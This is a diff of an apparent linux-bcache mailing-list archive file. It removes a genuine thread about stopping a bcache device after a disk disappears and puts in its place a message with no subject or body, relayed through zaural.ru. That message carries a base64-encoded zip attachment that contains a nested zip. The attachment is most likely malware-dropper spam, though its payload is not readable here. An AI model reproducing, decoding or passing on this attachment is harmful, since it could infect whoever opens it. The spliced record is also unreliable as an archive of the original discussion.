@@ -1,92 +1,74 @@
-From: Eric Wheeler <bcache@lists.ewheeler.net>
-Subject: Re: disk gone
-Date: Wed, 14 Jun 2017 00:24:50 +0000 (UTC)
-Message-ID: <alpine.LRH.2.11.1706140013280.14877@mail.ewheeler.net>
-References: <C081436D-3227-4388-A1DF-9764FB693924@gmail.com>        <alpine.LRH.2.11.1706090144550.19359@mail.ewheeler.net> <20170610121722.124dbfc0@jupiter.sol.kaishome.de>
+From: <kholloway@isd622.org>
+Subject: (unknown)
+Date: Wed, 14 Jun 2017 19:31:20 -0000
+Message-ID: <149746868051.29697.6011919641746807442@zaural.ru>
 Mime-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+Content-Type: application/zip; name="153610094672.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from mx.ewheeler.net ([66.155.3.69]:41658 "EHLO mail.ewheeler.net"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1752456AbdFNAYx (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
-        Tue, 13 Jun 2017 20:24:53 -0400
-In-Reply-To: <20170610121722.124dbfc0@jupiter.sol.kaishome.de>
+Received: from ws239.zone31-163-183.zaural.ru ([31.163.183.239]:38958 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752103AbdFNTbZ (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
+        Wed, 14 Jun 2017 15:31:25 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
 To: linux-bcache@vger.kernel.org
-Cc: feng D <fengidri@gmail.com>
 
-On Sat, 10 Jun 2017, Kai Krakow wrote:
-> Am Fri, 9 Jun 2017 01:46:24 +0000 (UTC)
-> schrieb Eric Wheeler <bcache@lists.ewheeler.net>:
-> 
-> > On Fri, 2 Jun 2017, feng D wrote:
-> > 
-> > > hi:
-> > > 
-> > > Some time, the online machine will appear disk gone situation,
-> > > although this is not very common, but we have too many machines, so
-> > > still will encounter it.
-> > > 
-> > > That in the case of disk gone, /sys/block/bcache0/bcache/stop is
-> > > not found, this case how to delete the bcache0?  
-> > 
-> > An interesting question.  Is it still available from the cache device
-> > in /sys/fs/bcache/* somewhere?  I'm guessing not, but check.
-> > 
-> > Do you have a procedure to reproduce this problem
-> > where /sys/block/bcache0 has been hotplugged into oblivion?
-> 
-> You easily run into the same situation when you stop the device instead
-> of detaching it. Bcache then doesn't release its cache device and
-> cannot be stopped/unregistered, because every interface for shutting
-> bcache down has vanished: It can only be reached through the backing
-> devices but the bcache interface below those is gone.
-> 
-> I think bcache needs a way to force unregister the cache device...
-> Otherwise the cache device stays busy and cannot be registered, neither
-> can any devices be attached again in this state.
-
-I'm having trouble reproducing:
-
-]# echo /dev/centos/bcache0 > /sys/fs/bcache/register
-]# echo /dev/centos/bcache0-cache > /sys/fs/bcache/register
-]# 
-]# echo 1 > /sys/block/bcache0/bcache/stop
-]# echo 1 > /sys/fs/bcache/3e57bc2e-4f01-4164-9b6d-54ef288ae394/stop
-]#
-]# echo /dev/centos/bcache0 > /sys/fs/bcache/register
-]# echo /dev/centos/bcache0-cache > /sys/fs/bcache/register
-
-also tried swapping the stop order:
-
-]# echo /dev/centos/bcache0 > /sys/fs/bcache/register
-]# echo /dev/centos/bcache0-cache > /sys/fs/bcache/register
-]#
-]# echo 1 > /sys/fs/bcache/3e57bc2e-4f01-4164-9b6d-54ef288ae394/stop   
-]# echo 1 > /sys/block/bcache0/bcache/stop 
-   >>> fails, no such file, but re-registers fine below
-]#
-]# echo /dev/centos/bcache0 > /sys/fs/bcache/register
-]# echo /dev/centos/bcache0-cache > /sys/fs/bcache/register
-
-What am I missing here?
-
-
---
-Eric Wheeler
-
-
-
-> 
-> -- 
-> Regards,
-> Kai
-> 
-> Replies to list-only preferred.
-> 
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-bcache" in
-> the body of a message to majordomo@vger.kernel.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
-> 
+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
